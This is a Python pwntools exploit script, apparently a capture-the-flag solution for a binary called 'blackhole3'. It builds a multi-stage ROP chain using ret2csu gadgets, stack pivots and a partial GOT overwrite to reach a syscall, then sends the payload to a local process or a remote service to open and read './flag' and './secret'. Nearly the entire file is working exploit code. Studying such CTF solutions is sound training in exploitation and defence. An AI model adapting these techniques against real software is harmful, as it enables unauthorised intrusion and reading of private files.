#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./blackhole3"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.it",3333)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.address)
    pause()
def search_gadget(elf, gadget):
    for g in elf.search(gadget):
        p = p64(g)
        if  '\t' not in p and '\n' not in p and '\x0b' not in p and '\x0c' not in p and '\x0d' not in p and ' ' not in p:
            return g
def ret2csu(rdi,rsi,rdx,func_got):
    return p64(0)+p64(1)+p64(func_got)+p64(rdx)+p64(rsi)+p64(rdi)+p64(0x400750)+"a"*8

csu_start = 0x40076A
leave_ret = 0x4006E5
ret = 0x400774
ret_got = 0x611310

input_base = 0x611000
input_base2 = 0x60e000
libc_base = input_base - 8

fake_file_addr = 0x611f00

flag_addr = 0x6020e0
flag = "./flag\x00\x00"
flag_buffer = 0x605000


rbx = 0xfffffffffffff1e5
rop8 = p64(csu_start)+p64(rbx)+p64(rbx+1)
rop9 = p64(0x400)+p64(flag_buffer)+p64(0x6020d8-0x70)+p64(0x400750)

rbx = 0xfffffffffffff1e4
rop6 = p64(csu_start)+p64(rbx)+p64(rbx+1)

rop7 = p64(0x400)+p64(flag_buffer)+p64(0x6020d0-0x70)+p64(0x400750)# call read
rop7 += p64(ret)*0x20 + p64(csu_start) + ret2csu(0,input_base+0x10-len(rop8),len(rop8),elf.got["my_read"])
rop7 += ret2csu(0,input_base+0x18,len(rop9),elf.got["my_read"])
rop7 += "a"*8+p64(input_base+0x8-len(rop8))+"a"*0x20+p64(leave_ret)


rop5 = "\xa6"
rbx = 0xfffffffffffff1e5
rop4 = p64(csu_start)+p64(rbx)+p64(rbx+1)+"\x30"

rop3 = p64(1)+p64(0)+p64(fake_file_addr)+p64(0x400750)
rop3 += p64(ret)*0x20+p64(csu_start)
rop3 += ret2csu(0,libc_base,len(rop5),elf.got["my_read"]) # overwrite to syscall
rop3 += p64(0) + p64(0) + p64(libc_base) + p64(2) + p64(0x610000) + p64(flag_addr) + p64(0x400750)  # open done!
rop3 += p64(1)*0x4 + p64(csu_start) + ret2csu(0,input_base+0x10-len(rop6),len(rop6),elf.got["my_read"])# partical r12
rop3 += ret2csu(0,input_base+0x18,len(rop7),elf.got["my_read"])# r12
rop3 += "a"*8+p64(input_base+0x8-len(rop6))+"a"*0x20+p64(leave_ret)

"""
rop2 = p64(csu_start) + ret2csu(0,1,2,elf.got["my_read"]) + p64(ret)*0x80 + p64(csu_start)+\
        ret2csu(0,input_base+0x10,len(rop3),elf.got["my_read"]) + \
        ret2csu(0,input_base+9-len(rop4),len(rop4),elf.got["my_read"]) + \
        "a"*8 + p64(input_base+1-len(rop4))+"a"*0x20 + p64(leave_ret) + flag + p64(ret)+p64(3)+p64(1)
"""
rop10 = p64(csu_start)+\
        ret2csu(0,input_base+0x10,len(rop3),elf.got["my_read"]) + \
        ret2csu(0,input_base+9-len(rop4),len(rop4),elf.got["my_read"]) + \
        "a"*8 + p64(input_base+1-len(rop4))+"a"*0x20 + p64(leave_ret) + flag + p64(ret)+p64(3)+p64(1)+"./secret\x00"

rop2 = p64(csu_start) + ret2csu(0,1,2,elf.got["my_read"]) +\
        ret2csu(0,0x602000,len(rop10),elf.got["my_read"]) +\
        "a"*8 + p64(0x602000-8)+"a"*0x20+p64(leave_ret)

rop1 = "a"*0x28 + p64(csu_start)+ret2csu(0,input_base,len(rop2),elf.got["my_read"])+\
        "A"*8+p64(input_base-8)+ "a"*32 + p64(leave_ret)

rop1 = rop1.ljust(0x100,'\x00')
# r.send(rop1)
# r.send(rop2)
# r.send(rop10)
# r.send(rop3)
# r.send(rop4)
# r.send(rop5)
# r.send(rop6)
# r.send(rop7)
# r.send(rop8)
# r.send(rop9)
data = rop1+rop2+rop10+rop3+rop4+rop5+rop6+rop7+rop8+rop9
with open("./exp","w+") as f:
    f.write(data.encode("hex"))
r.send(data)
print r.recv(0x400)
r.close()




